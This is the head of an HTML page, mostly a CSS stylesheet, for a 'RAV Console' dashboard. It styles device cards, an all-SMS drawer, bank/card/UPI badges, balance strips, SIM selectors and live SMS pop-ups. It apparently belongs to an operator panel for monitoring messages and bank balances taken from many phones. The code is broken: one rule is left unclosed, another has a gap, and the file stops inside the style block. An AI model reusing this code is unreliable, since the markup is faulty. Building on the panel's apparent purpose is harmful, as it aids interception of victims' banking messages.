<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RAV Console</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            border: 'hsl(0 0% 12%)',
            background: 'hsl(0 0% 3%)',
            foreground: 'hsl(0 0% 93%)',
          }
        }
      }
    };
  </script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  <style>
    /* ══════════════════════════════════════════════════════════════════
       THEME TOKENS  — swap body[data-theme] to re-skin everything
       ══════════════════════════════════════════════════════════════════ */
    :root, body[data-theme="dark"] {
      --bg:          #06060a;
      --card:        rgba(255,255,255,.048);
      --card-2:      rgba(255,255,255,.020);
      --card-3:      rgba(255,255,255,.030);
      --inset:       rgba(255,255,255,.055);
      --panel:       #0a0a12;
      --panel-solid: #0d0d16;
      --line:        rgba(255,255,255,.085);
      --line-2:      rgba(255,255,255,.17);
      --txt:         #f2f4fa;
      --txt-2:       #8590a8;
      --txt-3:       #5a6377;
      --txt-4:       #3d4657;
      --bar:         linear-gradient(180deg, rgba(21,23,40,.94), rgba(9,9,16,.78));
      --scrim:       rgba(3,3,8,.74);
      --shadow:      0 24px 60px rgba(0,0,0,.62);
      --shadow-sm:   0 10px 30px rgba(0,0,0,.45);
      --glow-a:      rgba(139,92,246,.22);
      --glow-b:      rgba(236,72,153,.16);
      --glow-c:      rgba(34,211,238,.06);
      --track:       rgba(255,255,255,.07);
      --nub:         #4a5162;
      --sel-bg:      #101018;
    }
    body[data-theme="light"] {
      --bg:          #eef0f6;
      --card:        #ffffff;
      --card-2:      #f7f8fc;
      --card-3:      rgba(15,23,42,.035);
      --inset:       #ffffff;
      --panel:       #ffffff;
      --panel-solid: #ffffff;
      --line:        rgba(15,23,42,.11);
      --line-2:      rgba(15,23,42,.20);
      --txt:         #0f172a;
      --txt-2:       #5b6478;
      --txt-3:       #7d8699;
      --txt-4:       #a6adbe;
      --bar:         linear-gradient(180deg, rgba(255,255,255,.94), rgba(255,255,255,.72));
      --scrim:       rgba(15,23,42,.42);
      --shadow:      0 22px 50px rgba(15,23,42,.13);
      --shadow-sm:   0 8px 22px rgba(15,23,42,.09);
      --glow-a:      rgba(139,92,246,.13);
      --glow-b:      rgba(236,72,153,.10);
      --glow-c:      rgba(34,211,238,.07);
      --track:       rgba(15,23,42,.10);
      --nub:         #98a1b3;
      --sel-bg:      #ffffff;
    }

    * { box-sizing: border-box; }
    html { -webkit-text-size-adjust: 100%; }
    body {
      background: var(--bg);
      color: var(--txt);
      font-family: 'Inter', ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
      margin: 0; min-height: 100vh;
      -webkit-font-smoothing: antialiased;
      transition: background .25s ease, color .25s ease;
    }
    body::before {
      content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0;
      background:
        radial-gradient(900px 520px at 78% -8%,  var(--glow-a), transparent 62%),
        radial-gradient(760px 460px at 6% 104%,  var(--glow-b), transparent 62%),
        radial-gradient(1100px 700px at 50% 40%, var(--glow-c), transparent 70%);
      transition: opacity .3s ease;
    }
    body.no-glow::before { opacity: 0; }
    #app { position: relative; z-index: 1; }

    ::-webkit-scrollbar { width: 5px; height: 5px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: var(--track); border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: var(--line-2); }
    select option { background: var(--sel-bg); color: var(--txt); }

    /* ── semantic utilities (theme-aware) ───────────────────────── */
    .tx1 { color: var(--txt); }
    .tx2 { color: var(--txt-2); }
    .tx3 { color: var(--txt-3); }
    .tx4 { color: var(--txt-4); }
    .surface  { background: var(--card); border: 1px solid var(--line); }
    .surface2 { background: var(--card-2); }
    .surface3 { background: var(--card-3); }
    .insetbg  { background: var(--inset); }
    .bd   { border-color: var(--line); }
    .bd2  { border-color: var(--line-2); }
    .panelbg { background: var(--panel); }
    .scrimbg { background: var(--scrim); }

    /* ── animations ───────────────────────────────────────────────── */
    @keyframes fadeIn  { from {opacity:0;transform:translateY(10px) scale(.985);filter:blur(2px)} to {opacity:1;transform:none;filter:none} }
    @keyframes fadeUp  { from {opacity:0;transform:translateY(8px)} to {opacity:1;transform:none} }
    @keyframes cardIn  { from {opacity:0;transform:translateY(14px) scale(.97)} to {opacity:1;transform:none} }
    @keyframes popIn   { 0% {opacity:0;transform:translateY(9px) scale(.86)} 100% {opacity:1;transform:none} }
    @keyframes panelIn { from {opacity:.3;transform:translateX(34px)} to {opacity:1;transform:none} }
    @keyframes shim    { 0% { background-position: 200% 0 } 100% { background-position: -200% 0 } }
    @keyframes sheen   { 0% { transform: translateX(-130%) skewX(-18deg) } 100% { transform: translateX(240%) skewX(-18deg) } }
    @keyframes glint   { 0%,100%{transform:scale(1);opacity:.4} 50%{transform:scale(1.5);opacity:1} }
    @keyframes spin    { to { transform: rotate(360deg) } }
    @keyframes pulseK  { 0%,100%{opacity:1} 50%{opacity:.45} }
    @keyframes slideUpIn  { from {opacity:0;transform:translate(-50%,30px) scale(.95)} to {opacity:1;transform:translate(-50%,0) scale(1)} }
    @keyframes slideDownOut{ from {opacity:1;transform:translate(-50%,0) scale(1)} to {opacity:0;transform:translate(-50%,20px) scale(.95)} }
    @keyframes smsTopIn   { from {opacity:0;transform:translate(-50%,-26px) scale(.94)} to {opacity:1;transform:translate(-50%,0) scale(1)} }
    @keyframes smsTopOut  { from {opacity:1;transform:translate(-50%,0) scale(1)} to {opacity:0;transform:translate(-50%,-18px) scale(.96)} }
    @keyframes shrink  { from { transform: scaleX(1) } to { transform: scaleX(0) } }
    .animate-fade-in { animation: fadeIn .8s ease-out both; }
    .animate-fade-up { animation: fadeUp .28s ease-out both; }
    .animate-glint   { animation: glint 1.6s infinite; }
    .animate-spin    { animation: spin 1s linear infinite; }
    .animate-pulse   { animation: pulseK 2s cubic-bezier(.4,0,.6,1) infinite; }
    .sms-popup-enter { animation: smsTopIn .34s cubic-bezier(.34,1.56,.64,1) forwards; }
    .sms-popup-exit  { animation: smsTopOut .24s ease-in forwards; }

    /* ── animated RAV brand mark ──────────────────────────────────── */
    @keyframes brandFloat  { 0%,100% { transform: translateY(-2px) } 50% { transform: translateY(3px) } }
    @keyframes brandHue    { 0% { filter: hue-rotate(0deg) drop-shadow(0 0 10px rgba(251,191,36,.55)) } 100% { filter: hue-rotate(360deg) drop-shadow(0 0 10px rgba(251,191,36,.55)) } }
    @keyframes brandShift  { 0%,100% { background-position: 0% 50% } 50% { background-position: 100% 50% } }
    .brandmark { display: inline-flex; align-items: center; gap: .22em; line-height: 1; animation: brandFloat 2.8s ease-in-out infinite; }
    .brandmark .brand-crown { width: .92em; height: .92em; flex-shrink: 0; animation: brandHue 5.5s linear infinite; }
    .brandmark .brand-text {
      font-weight: 900; letter-spacing: -.03em;
      background: linear-gradient(92deg,#fbbf24,#f472b6,#a78bfa,#22d3ee,#fbbf24);
      background-size: 300% 100%;
      -webkit-background-clip: text; background-clip: text; color: transparent;
      animation: brandShift 4.5s ease-in-out infinite;
    }
    .brandmark.brand-xl { font-size: 40px; gap: .16em; }
    .brandmark.brand-xl .brand-text { font-size: inherit; }
    /* shared utility: KING RAV colour-shift text (Dashboard heading etc.) */
    .brandshift {
      background: linear-gradient(92deg,#fbbf24,#f472b6,#a78bfa,#22d3ee,#fbbf24);
      background-size: 300% 100%;
      -webkit-background-clip: text; background-clip: text; color: transparent;
      animation: brandShift 4.5s ease-in-out infinite;
    }

    /* ── labelled toggle switch ───────────────────────────────────── */
    .swtoggle {
      display: inline-flex; align-items: center; gap: 9px; height: 40px; padding: 0 12px;
      border-radius: 12px; border: 1px solid var(--line); background: var(--card);
      color: var(--txt-2); font-size: 12px; font-weight: 800; cursor: pointer;
      transition: all .16s ease; white-space: nowrap;
    }
    .swtoggle:hover { color: var(--txt); border-color: var(--line-2); }
    .swtoggle.on { color: #fff; border-color: rgba(34,197,94,.55); background: rgba(34,197,94,.14); }
    .swtrack { position: relative; width: 30px; height: 17px; border-radius: 999px; background: var(--track); transition: background .18s ease; flex-shrink: 0; }
    .swtrack::after { content: ''; position: absolute; top: 2px; left: 2px; width: 13px; height: 13px; border-radius: 50%; background: var(--nub); transition: all .18s ease; }
    .swtoggle.on .swtrack { background: rgba(34,197,94,.55); }
    .swtoggle.on .swtrack::after { left: 15px; background: #fff; }

    /* ── all-sms drawer rows ──────────────────────────────────────── */
    .smsrow {
      display: block; width: 100%; text-align: left; cursor: pointer;
      padding: 11px 13px; border-radius: 14px; border: 1px solid var(--line);
      border-left: 3px solid #6d28d9; background: var(--card-3);
      transition: border-color .16s ease, background .16s ease;
      /* scroll-jank killer: offscreen rows skip layout & paint entirely */
      content-visibility: auto; contain-intrinsic-size: auto 74px;
    }
    .smsrow:hover { border-color: rgba(139,92,246,.5); background: var(--card-2); transform: translateY(-1px); }
    .smsrow:active { transform: scale(.985); }
    .smsrow.bank { border-left-color: #22c55e; background: rgba(34,197,94,.05); }
    .smsrow.card { border-left-color: #a855f7; background: rgba(168,85,247,.06); }
    .smsrow .smsrow-top { display: flex; align-items: center; gap: 7px; min-width: 0; margin-bottom: 4px; }
    .smsrow .smsrow-dev { font-size: 10.5px; font-weight: 800; color: var(--txt); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .smsrow .smsrow-snd { font-size: 10.5px; font-weight: 700; color: #a78bfa; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex-shrink: 0; max-width: 42%; }
    .smsrow .smsrow-time { font-size: 9.5px; font-family: ui-monospace, Menlo, monospace; color: var(--txt-4); margin-left: auto; flex-shrink: 0; }
    .smsrow .smsrow-text { font-size: 11.5px; color: var(--txt-2); line-height: 1.45; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; word-break: break-word; }

    /* ══ APP SHELL ══════════════════════════════════════════════════════ */
    .shell { max-width: 1560px; margin: 0 auto; padding: 0 18px 60px; }
    @media (min-width: 768px) { .shell { padding: 0 28px 80px; } }

    /* ── top bar ───────────────────────────────────────────────────── */
    .topbar {
      position: sticky; top: 0; z-index: 45;
      display: flex; align-items: center; gap: 12px;
      padding: 13px 18px;
      border-bottom: 1px solid var(--line);
      background: var(--bar);
      backdrop-filter: blur(16px);
    }
    @media (min-width: 768px) { .topbar { padding: 15px 28px; } }
    .app-title {
      font-size: 25px; font-weight: 800; letter-spacing: -.025em; margin: 0;
      background: linear-gradient(92deg, var(--txt) 8%, #c4b5fd 58%, #67e8f9 100%);
      -webkit-background-clip: text; background-clip: text; color: transparent;
    }
    @media (min-width: 768px) { .app-title { font-size: 29px; } }

    .icon-btn {
      display: inline-flex; align-items: center; justify-content: center;
      width: 42px; height: 42px; flex-shrink: 0;
      border-radius: 14px; border: 1px solid var(--line);
      background: var(--card); color: var(--txt-2);
      cursor: pointer; transition: all .18s ease;
    }
    .icon-btn:hover { background: var(--card-2); color: var(--txt); border-color: var(--line-2); }
    .icon-btn.on { color: #fff; border-color: rgba(139,92,246,.55); background: rgba(139,92,246,.18); }

    /* ── control bar ───────────────────────────────────────────────── */
    .controlbar { display: flex; align-items: center; gap: 12px; padding: 16px 0 12px; flex-wrap: wrap; }
    .searchbox {
      flex: 1 1 260px; min-width: 0; display: flex; align-items: center; gap: 12px;
      height: 54px; padding: 0 18px; border-radius: 18px;
      border: 1px solid var(--line); background: var(--card);
      transition: border-color .18s ease, background .18s ease;
    }
    .searchbox:focus-within { border-color: rgba(139,92,246,.6); background: var(--card-2); }
    .searchbox input {
      flex: 1; min-width: 0; background: none; border: 0; outline: none;
      color: var(--txt); font-size: 16px; font-weight: 600;
    }
    .searchbox input::placeholder { color: var(--txt-4); font-weight: 500; }
    .chip {
      display: inline-flex; align-items: center; gap: 9px;
      height: 54px; padding: 0 20px; border-radius: 18px;
      border: 1px solid var(--line); background: var(--card);
      color: var(--txt-2); font-size: 15px; font-weight: 700; cursor: pointer;
      transition: all .18s ease; white-space: nowrap;
    }
    .chip:hover { background: var(--card-2); color: var(--txt); border-color: var(--line-2); }
    .chip.on { color: #fff; border-color: rgba(139,92,246,.6); background: rgba(139,92,246,.18); }
    .chip.sm { height: 40px; padding: 0 15px; border-radius: 13px; font-size: 13.5px; }

    /* ── meta row ──────────────────────────────────────────────────── */
    .metabar {
      display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
      padding: 2px 0 16px; color: var(--txt-2); font-size: 14.5px; font-weight: 600;
    }
    .latpill {
      display: inline-flex; align-items: center; gap: 6px;
      padding: 7px 16px; border-radius: 999px; font-weight: 800; font-size: 14px;
      font-variant-numeric: tabular-nums;
      background: rgba(244,63,94,.12); border: 1px solid rgba(244,63,94,.38); color: #ff5c8a;
    }
    .latpill.good { background: rgba(34,197,94,.12); border-color: rgba(34,197,94,.35); color: #4ade80; }
    .latpill.warn { background: rgba(245,158,11,.12); border-color: rgba(245,158,11,.35); color: #fbbf24; }
    .livedot { width: 11px; height: 11px; border-radius: 50%; background: #22c55e; box-shadow: 0 0 11px rgba(34,197,94,.9); }
    .livedot.idle { background: #f59e0b; box-shadow: 0 0 11px rgba(245,158,11,.8); }
    .livedot.err  { background: #f43f5e; box-shadow: 0 0 11px rgba(244,63,94,.8); }

    .hairline { height: 1px; background: linear-gradient(90deg, transparent, #7c3aed 18%, #ec4899 46%, #22d3ee 74%, transparent); opacity: .85; }

    /* ── section title ─────────────────────────────────────────────── */
    .sectitle {
      display: flex; align-items: center; gap: 12px;
      margin: 28px 0 18px; font-size: 25px; font-weight: 800; letter-spacing: -.02em; color: var(--txt);
    }
    @media (min-width: 768px) { .sectitle { font-size: 28px; } }
    .sectitle .emoji { font-size: 26px; line-height: 1; }

    /* ── stat cards ────────────────────────────────────────────────── */
    .stat-grid { display: grid; grid-template-columns: repeat(2, minmax(0,1fr)); gap: 14px; }
    @media (min-width: 1024px) { .stat-grid { grid-template-columns: repeat(4, minmax(0,1fr)); gap: 18px; } }
    .stat-grid > * { animation: fadeUp .5s ease-out both; }
    .stat-grid > :nth-child(2) { animation-delay: .05s; }
    .stat-grid > :nth-child(3) { animation-delay: .1s; }
    .stat-grid > :nth-child(4) { animation-delay: .15s; }
    .stat-grid > :nth-child(5) { animation-delay: .2s; }
    .stat-card .stat-pop { display: inline-block; animation: popIn .38s cubic-bezier(.34,1.4,.64,1) both; }
    .stat-card {
      position: relative; overflow: hidden;
      border-radius: var(--radius, 22px); border: 1px solid var(--line);
      background: linear-gradient(165deg, var(--card), var(--card-2));
      padding: 26px 24px 28px 30px; min-height: 132px;
      transition: border-color .2s ease, transform .2s ease;
    }
    .stat-card:hover { border-color: var(--line-2); transform: translateY(-2px); }
    .stat-card::before {
      content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 5px;
      background: var(--stripe); border-radius: 22px 0 0 22px;
    }
    .stat-card::after {
      content: ''; position: absolute; right: -70px; top: -90px; width: 240px; height: 240px;
      background: radial-gradient(circle, var(--tint), transparent 68%); opacity: .55; pointer-events: none;
    }
    .stat-card.wide { grid-column: span 2; }
    @media (min-width: 1024px) { .stat-card.wide { grid-column: span 4; } }
    .stat-label {
      font-size: 12.5px; font-weight: 800; letter-spacing: .15em; text-transform: uppercase;
      margin: 0 0 6px;
      /* KING RAV colour-shift system — same animated gradient as the brand mark */
      background: linear-gradient(92deg,#fbbf24,#f472b6,#a78bfa,#22d3ee,#fbbf24);
      background-size: 300% 100%;
      -webkit-background-clip: text; background-clip: text; color: transparent;
      animation: brandShift 4.5s ease-in-out infinite;
    }
    .stat-value {
      margin: 0; font-size: clamp(30px, 3.6vw, 44px); font-weight: 900;
      letter-spacing: -.025em; line-height: 1.05; position: relative; z-index: 1;
    }
    .stat-value.sm { font-size: clamp(26px, 3vw, 38px); }
    .stat-sub { margin: 6px 0 0; font-size: 11.5px; font-weight: 700; color: var(--txt-3); position: relative; z-index: 1; }
    .stat-white  { color: #ffffff; }
    .stat-total  { color: #25e07f; }
    .stat-green  { color: #25e07f; }
    .stat-pink   { color: #ff2f6d; }
    .stat-indigo { color: #7b8cff; }
    .stat-amber  { color: #ffa62b; }

    .tzline { margin: 20px 0 4px; color: var(--txt-2); font-size: 15px; font-weight: 600; }
    .tzline b { color: #8b96f0; font-weight: 800; }

    /* ── server selector row ──────────────────────────────────────── */
    .serverrow { display: flex; align-items: center; gap: 18px; margin: 16px 0 8px; flex-wrap: wrap; }
    .server-picker {
      position: relative; display: inline-flex; align-items: center; gap: 12px;
      min-width: 250px; height: 58px; padding: 0 20px;
      border-radius: 18px; border: 1px solid var(--line-2); background: var(--card);
      color: var(--txt); font-size: 18px; font-weight: 800; cursor: pointer;
      transition: all .18s ease;
    }
    .server-picker:hover { border-color: rgba(139,92,246,.65); background: var(--card-2); }
    .server-picker .chev { margin-left: auto; color: var(--txt-3); }
    .dropdown {
      position: absolute; top: calc(100% + 8px); left: 0; z-index: 60;
      min-width: 100%; max-height: 340px; overflow-y: auto;
      border-radius: 18px; border: 1px solid var(--line-2);
      background: var(--panel-solid); box-shadow: var(--shadow);
      padding: 8px; animation: fadeUp .16s ease-out both;
    }
    .dropdown.right { left: auto; right: 0; min-width: 210px; }
    .dropdown button {
      display: flex; align-items: center; gap: 10px; width: 100%;
      padding: 10px 14px; border-radius: 12px; border: 0; background: none;
      color: var(--txt-2); font-size: 14px; font-weight: 600; text-align: left; cursor: pointer;
      transition: background .14s ease, color .14s ease;
    }
    .dropdown button:hover { background: var(--card-2); color: var(--txt); }
    .dropdown button.sel { color: var(--txt); background: rgba(139,92,246,.17); }
    .dropdown .sep { height: 1px; background: var(--line); margin: 6px 4px; }

    /* ── filter pills ──────────────────────────────────────────────── */
    .filterbar { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin: 18px 0 16px; }
    .pill {
      padding: 8px 15px; border-radius: 12px; border: 1px solid var(--line);
      background: var(--card); color: var(--txt-2);
      font-size: 12.5px; font-weight: 700; text-transform: capitalize; cursor: pointer;
      transition: all .16s ease;
    }
    .pill:hover { color: var(--txt); border-color: var(--line-2); background: var(--card-2); }
    .pill.on { color: #fff; border-color: rgba(139,92,246,.6); background: rgba(139,92,246,.20); }
    .pill.on.green  { border-color: rgba(34,197,94,.55);  background: rgba(34,197,94,.16); }
    .pill.on.purple { border-color: rgba(168,85,247,.55); background: rgba(168,85,247,.16); }
    .pill.on.yellow { border-color: rgba(245,158,11,.55); background: rgba(245,158,11,.16); }
    .pill.srv { border-radius: 999px; font-size: 11px; padding: 6px 12px; }

    /* ── device cards ──────────────────────────────────────────────── */
    .dev-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(258px, 1fr)); gap: 14px; }
    .dev-card {
      position: relative; overflow: hidden; cursor: pointer;
      border-radius: 20px; border: 1px solid var(--line);
      background: linear-gradient(165deg, var(--card), var(--card-2));
      padding: 16px 16px 14px 20px;
      transition: border-color .2s ease, transform .2s ease, box-shadow .2s ease;
      content-visibility: auto; contain-intrinsic-size: 0 220px;
      /* staggered entrance — GPU-only (transform/opacity), zero-jank on cheap phones */
      animation: cardIn .5s cubic-bezier(.22,1,.36,1) both;
      animation-delay: calc(var(--ci, 0) * 26ms);
    }
    .dev-card:hover { border-color: rgba(139,92,246,.45); transform: translateY(-2px); box-shadow: var(--shadow-sm); }
    .dev-card:active { transform: scale(.98); }
    /* shine sweep on hover — transform-only, GPU */
    .dev-card::after {
      content: ''; position: absolute; top: 0; left: 0; bottom: 0; width: 34%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,.055), transparent);
      transform: translateX(-130%) skewX(-18deg); pointer-events: none;
    }
    @media (hover:hover) { .dev-card:hover::after { animation: sheen .8s ease forwards; } }
    .dev-card.offline::after { display: none; }
    .dev-card::before {
      content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 4px;
      background: linear-gradient(180deg, #22d3ee, #8b5cf6 52%, #ec4899); opacity: .9;
    }
    .dev-card.offline::before { background: linear-gradient(180deg, #94a3b8, #64748b); opacity: .55; }
    .dev-name { font-size: 13.5px; font-weight: 800; color: var(--txt); }
    .dev-sub  { font-size: 10.5px; color: var(--txt-4); font-family: ui-monospace, 'SF Mono', Menlo, monospace; }
    .dev-meta-label { font-size: 9px; font-weight: 800; letter-spacing: .14em; text-transform: uppercase; color: var(--txt-3); margin: 0 0 3px; }
    .dev-meta-val { font-size: 12.5px; font-weight: 700; color: var(--txt-2); margin: 0; }
    .dev-meta-val.filled { color: var(--txt); }

    .batt { display: inline-flex; align-items: center; gap: 7px; }
    .batt-shell {
      position: relative; display: inline-flex; align-items: center;
      width: 28px; height: 13px; padding: 2px; border-radius: 4px; border: 1px solid var(--nub);
    }
    .batt-fill { height: 100%; border-radius: 2px; transition: width .5s ease; }
    .batt-nub { width: 3px; height: 5px; background: var(--nub); border-radius: 0 2px 2px 0; margin-left: -1px; }

    .badge {
      display: inline-flex; align-items: center; gap: 5px;
      padding: 4px 10px; border-radius: 999px; font-size: 10px; font-weight: 800;
    }
    .badge.bank  { background: rgba(34,197,94,.13);  border: 1px solid rgba(34,197,94,.3);  color: #4ade80; }
    .badge.card  { background: rgba(168,85,247,.14); border: 1px solid rgba(168,85,247,.32); color: #c084fc; }
    .badge.upi   { background: rgba(245,158,11,.14); border: 1px solid rgba(245,158,11,.32); color: #fbbf24; }
    .badge.on    { background: rgba(34,197,94,.13);  border: 1px solid rgba(34,197,94,.3);  color: #4ade80; }
    .badge.on > :first-child { animation: pulseK 2.4s ease-in-out infinite; }
    .badge.off   { background: var(--card-3); border: 1px solid var(--line); color: var(--txt-3); }
    .badge.sync  { background: rgba(245,158,11,.10); border: 1px solid rgba(245,158,11,.25); color: #fbbf24; }

    .balance-strip {
      display: flex; align-items: center; justify-content: space-between; gap: 10px;
      padding: 9px 12px; border-radius: 14px; margin-top: 12px;
      background: rgba(34,197,94,.09); border: 1px solid rgba(34,197,94,.22);
    }
    .balance-strip.purple { background: rgba(168,85,247,.10); border-color: rgba(168,85,247,.25); }

    /* ── drawer / modal ────────────────────────────────────────────── */
    .scrim { position: fixed; inset: 0; z-index: 70; background: var(--scrim); backdrop-filter: blur(7px); animation: fadeUp .18s ease-out both; }
    .drawer {
      position: fixed; top: 0; right: 0; bottom: 0; z-index: 71; width: min(430px, 100%);
      background: var(--panel); border-left: 1px solid var(--line);
      box-shadow: var(--shadow); display: flex; flex-direction: column;
      animation: drawerIn .26s cubic-bezier(.22,1,.36,1) both;
    }
    @keyframes drawerIn { from { transform: translateX(40px); opacity: 0 } to { transform: none; opacity: 1 } }

    /* ── forms ─────────────────────────────────────────────────────── */
    .inp {
      width: 100%; padding: 12px 14px; border-radius: 14px;
      background: var(--inset); border: 1px solid var(--line);
      color: var(--txt); font-size: 13.5px; outline: none; transition: all .16s ease;
    }
    .inp:focus { border-color: rgba(139,92,246,.65); box-shadow: 0 0 0 3px rgba(139,92,246,.14); }
    .inp::placeholder { color: var(--txt-4); }
    .btn-primary {
      display: inline-flex; align-items: center; justify-content: center; gap: 9px;
      width: 100%; padding: 13px 18px; border-radius: 15px; border: 0; cursor: pointer;
      background: linear-gradient(120deg, #7c3aed, #a855f7 48%, #ec4899);
      color: #fff; font-size: 13.5px; font-weight: 800; letter-spacing: .01em;
      box-shadow: 0 12px 34px rgba(124,58,237,.32); transition: all .18s ease;
    }
    .btn-primary:hover { opacity: .92; }
    .btn-primary:disabled { opacity: .45; cursor: not-allowed; box-shadow: none; }
    .btn-ghost {
      display: inline-flex; align-items: center; justify-content: center; gap: 9px;
      width: 100%; padding: 13px 18px; border-radius: 15px; cursor: pointer;
      background: var(--card); border: 1px dashed var(--line-2); color: var(--txt-2);
      font-size: 13.5px; font-weight: 700; transition: all .18s ease;
    }
    .btn-ghost:hover { color: var(--txt); border-color: rgba(139,92,246,.55); background: rgba(139,92,246,.10); }
    .card-shell { border-radius: 26px; border: 1px solid var(--line); background: var(--card); backdrop-filter: blur(14px); }
    .violet-gradient { background: linear-gradient(120deg, #6d28d9, #8b5cf6 50%, #d946ef); }

    /* ── toasts ────────────────────────────────────────────────────── */
    .toast-stack { position: fixed; bottom: 26px; left: 50%; transform: translateX(-50%); z-index: 120; display: flex; flex-direction: column; gap: 9px; align-items: center; pointer-events: none; }
    .toast {
      display: flex; align-items: center; gap: 9px; padding: 11px 20px;
      border-radius: 999px; border: 1px solid var(--line-2); background: var(--panel-solid);
      box-shadow: var(--shadow-sm); color: var(--txt); font-size: 13.5px; font-weight: 700;
      animation: fadeUp .22s ease-out both;
    }

    /* ── device panel ───────────────────────────────────────────────── */
    .tabbar { display: flex; border-bottom: 1px solid var(--line); padding: 0 8px; overflow-x: auto; flex-shrink: 0; }
    .tab {
      padding: 14px 15px; font-size: 12px; font-weight: 800; border-bottom: 2px solid transparent;
      color: var(--txt-2); background: none; border-top: 0; border-left: 0; border-right: 0;
      cursor: pointer; white-space: nowrap; transition: all .16s ease;
    }
    .tab:hover { color: var(--txt); }
    .tab.on { color: var(--txt); border-bottom-color: #8b5cf6; }
    .tab.on.green  { border-bottom-color: #22c55e; }
    .tab.on.purple { border-bottom-color: #a855f7; }

    .inforow { display: flex; align-items: flex-start; justify-content: space-between; gap: 12px; padding: 10px 0; border-bottom: 1px solid var(--line); }
    .inforow:last-child { border-bottom: 0; }
    .inforow .k { font-size: 12px; color: var(--txt-2); font-weight: 600; flex-shrink: 0; width: 118px; }
    .inforow .v { font-size: 12.5px; color: var(--txt); font-weight: 700; text-align: right; word-break: break-all; }

    .msgitem { padding: 12px 13px; border-radius: 14px; border: 1px solid var(--line); border-left-width: 3px; content-visibility: auto; contain-intrinsic-size: auto 92px; }
    .msgitem.bank  { background: rgba(34,197,94,.06);   border-left-color: #16a34a; }
    .msgitem.card  { background: rgba(168,85,247,.07); border-left-color: #a855f7; }
    .msgitem.plain { background: var(--card-3);         border-left-color: #6d28d9; }

    .bankrow { padding: 13px; border-radius: 15px; background: rgba(34,197,94,.055); border: 1px solid rgba(34,197,94,.22); border-left: 3px solid #22c55e; }
    .cardrow { padding: 13px; border-radius: 15px; background: rgba(168,85,247,.06); border: 1px solid rgba(168,85,247,.22); border-left: 3px solid #a855f7; }

    .simbtn {
      flex: 1; padding: 11px; border-radius: 13px; cursor: pointer; font-size: 13px; font-weight: 800;

    .simbtn.on { background: linear-gradient(120deg,#7c3aed,#a855f7); color: #fff; border-color: transparent; box-shadow: 0 8px 22px rgba(124,58,237,.32); }

    .skel { border-radius: 20px; border: 1px solid var(--line); background: var(--card-3); padding: 16px; }
    .skel-bar {
      height: 11px; border-radius: 6px;
      background: linear-gradient(90deg, var(--card-3) 30%, rgba(255,255,255,.075) 50%, var(--card-3) 70%);
      background-size: 200% 100%;
      animation: shim 1.1s linear infinite;
    }

    .sr-row { display: flex; align-items: center; gap: 12px; padding: 13px 14px; border-radius: 15px; border: 1px solid var(--line); background: var(--card-3); }
    .sr-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }

    .copybtn { display: inline-flex; align-items: center; justify-content: center; width: 28px; height: 28px; border-radius: 9px; border: 1px solid var(--line); background: var(--card); color: var(--txt-3); cursor: pointer; transition: all .16s ease; flex-shrink: 0; }
    .copybtn:hover { color: var(--txt); background: var(--card-2); }

    .sms-pop {
      position: fixed; top: 76px; z-index: 200; width: min(320px, calc(100vw - 28px));

      cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent;
      will-change: transform, opacity;
    }

    /* ── snappy press feedback (transform-only, GPU) ─────────────── */
    .icon-btn:active, .chip:active, .pill:active, .copybtn:active, .swtoggle:active, .simbtn:active { transform: scale(.94); }
    .tab:active { transform: translateY(1px); }
    .btn-primary:not(:disabled):active { transform: scale(.97); }
    .stat-card:active { transform: scale(.99); }

    /* ── scroll containers: contain paint so scrolling never stutters ── */
    .pscroll, .dscroll { contain: paint; overscroll-behavior: contain; -webkit-overflow-scrolling: touch; }

    /* ── dropdown menu item stagger ───────────────────────────────── */
    .dropdown > * { animation: fadeUp .22s ease-out both; }
    .dropdown > :nth-child(2) { animation-delay: .03s; }
    .dropdown > :nth-child(3) { animation-delay: .06s; }
    .dropdown > :nth-child(4) { animation-delay: .09s; }
    .dropdown > :nth-child(5) { animation-delay: .12s; }
    .dropdown > :nth-child(6) { animation-delay: .15s; }
    .dropdown > :nth-child(7) { animation-delay: .18s; }

    /* ── device panel slide-in ────────────────────────────────────── */
    .devpanel-in { animation: panelIn .28s cubic-bezier(.22,1,.36,1) both; }

    /* ══ PERFORMANCE MODE (low-RAM phones) ═══════════════════════════
       skips the expensive paints (backdrop blur, big soft shadows, big
       hover lifts), shortens non-functional animations, and keeps the
       structure identical. Auto-detected once + toggleable in menu.  */
    /* ── blue neon glow-line hover (chips · box/circle buttons) ───── */
    @keyframes neonGlow {
      0%,100% { border-color: #38bdf8; box-shadow: 0 0 0 1.5px rgba(56,189,248,.9), 0 0 14px rgba(56,189,248,.5), 0 0 30px rgba(56,189,248,.22), inset 0 0 14px rgba(56,189,248,.12); }
      50%     { border-color: #7dd3fc; box-shadow: 0 0 0 1.5px rgba(125,211,252,1), 0 0 24px rgba(56,189,248,.85), 0 0 46px rgba(56,189,248,.35), inset 0 0 22px rgba(56,189,248,.22); }
    }
    .chip:hover, .icon-btn:hover, .swtoggle:hover, .server-picker:hover,
    .simbtn:not(.on):hover, .dropdown > button:hover {
      animation: neonGlow 1.2s ease-in-out infinite;
    }

    body.perf * { backdrop-filter: none !important; }
    body.perf::before { content: none !important; }
